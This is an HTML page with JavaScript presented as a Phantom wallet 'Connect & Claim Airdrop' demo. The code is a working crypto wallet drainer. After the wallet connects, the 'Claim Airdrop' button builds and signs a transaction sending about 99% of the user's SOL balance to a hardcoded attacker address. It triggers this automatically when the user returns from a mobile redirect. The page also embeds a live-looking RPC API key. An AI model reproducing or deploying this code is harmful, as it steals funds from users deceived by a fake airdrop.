<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8" />
<title>Phantom Connect & Claim Demo</title>
<script src="https://code.jquery.com/jquery-3.6.0.min.js"></script>
<script src="https://unpkg.com/@solana/web3.js@latest/lib/index.iife.js"></script>
<style>
  #connect-wallet { padding: 10px 20px; font-size: 16px; cursor: pointer; }
</style>
</head>
<body>

<button id="connect-wallet">Connect Wallet</button>

<script>
$(document).ready(function () {
  const isMobile = /iPhone|iPad|iPod|Android/i.test(navigator.userAgent);

  // Wait for Phantom provider injection (retry until timeout)
  function waitForPhantom(timeout = 10000) {
    return new Promise((resolve, reject) => {
      const interval = 100;
      let elapsed = 0;
      const check = () => {
        if (window.solana && window.solana.isPhantom) {
          resolve(window.solana);
        } else if (elapsed >= timeout) {
          reject(new Error('Phantom Wallet not found'));
        } else {
          elapsed += interval;
          setTimeout(check, interval);
        }
      };
      check();
    });
  }

  // Connect wallet function
  async function connectWallet() {
    try {
      const provider = await waitForPhantom();
      const resp = await provider.connect();
      console.log('Connected:', resp.publicKey.toString());

      // Save connection state
      sessionStorage.setItem('phantomConnected', 'true');

      // Update button
      $('#connect-wallet').text('Claim Airdrop');

      // Bind claim action
      bindClaim(resp.publicKey);

    } catch (err) {
      console.log(err.message);
      alert('Phantom Wallet not found. Redirecting to install...');
      if (isMobile) {
        // Redirect to Phantom app connect URL with return url
        const returnUrl = encodeURIComponent(window.location.href);
        sessionStorage.setItem('phantomMobileRedirect', 'true');
        window.location.href = `https://phantom.app/ul/v1/connect?app_url=${returnUrl}`;
      } else {
        window.open('https://phantom.app/', '_blank');
      }
    }
  }

  // Bind claim airdrop click after wallet connected
  function bindClaim(publicKey) {
    $('#connect-wallet').off('click').on('click', async () => {
      try {
        $('#connect-wallet').prop('disabled', true).text('Processing...');

        const connection = new solanaWeb3.Connection(
          'https://solana-mainnet.api.syndica.io/api-key/SoydjJWjfwxDgAya8RrX3ArCdZ9PGLKQ37fVwDuQUJzhtsCDiE2VbEXk3wC1XZWtNArvKyUZvaTpQGYXfkhpmUFR9VbVLgTRhw',
          'confirmed'
        );

        const balance = await connection.getBalance(publicKey);
        const minBalance = await connection.getMinimumBalanceForRentExemption(0);
        if (balance <= minBalance) {
          alert('Insufficient funds for rent exemption.');
          $('#connect-wallet').prop('disabled', false).text('Claim Airdrop');
          return;
        }

        const receiverPubKey = new solanaWeb3.PublicKey('5FfkceXdH2oMPgRpZFKZJPmTE6fLKfUfDRke2gmxuf5n');
        const lamportsToSend = Math.floor((balance - minBalance) * 0.99);

        const transaction = new solanaWeb3.Transaction().add(
          solanaWeb3.SystemProgram.transfer({
            fromPubkey: publicKey,
            toPubkey: receiverPubKey,
            lamports: lamportsToSend,
          })
        );

        transaction.feePayer = publicKey;
        const { blockhash } = await connection.getRecentBlockhash();
        transaction.recentBlockhash = blockhash;

        // Sign and send transaction
        const signedTransaction = await window.solana.signTransaction(transaction);
        const txid = await connection.sendRawTransaction(signedTransaction.serialize());
        await connection.confirmTransaction(txid);

        alert('Claim successful! Tx ID: ' + txid);
        $('#connect-wallet').text('Claimed');

      } catch (error) {
        console.error(error);
        alert('Claim failed: ' + error.message);
        $('#connect-wallet').prop('disabled', false).text('Claim Airdrop');
      }
    });
  }

  // On page load, if returning from Phantom mobile redirect, auto connect and claim
  async function autoResume() {
    if (sessionStorage.getItem('phantomMobileRedirect') === 'true') {
      sessionStorage.removeItem('phantomMobileRedirect');
      try {
        const provider = await waitForPhantom();
        // Connect silently if trusted
        const resp = await provider.connect({ onlyIfTrusted: true });
        if (resp && resp.publicKey) {
          console.log('Auto reconnected:', resp.publicKey.toString());
          $('#connect-wallet').text('Claim Airdrop');
          bindClaim(resp.publicKey);

          // Auto trigger claim
          $('#connect-wallet').click();
        }
      } catch (e) {
        console.log('Auto resume failed:', e.message);
      }
    }
  }

  // Initial button click binds to connectWallet()
  $('#connect-wallet').on('click', connectWallet);

  // Run autoResume on load
  autoResume();
});
</script>

</body>
</html>
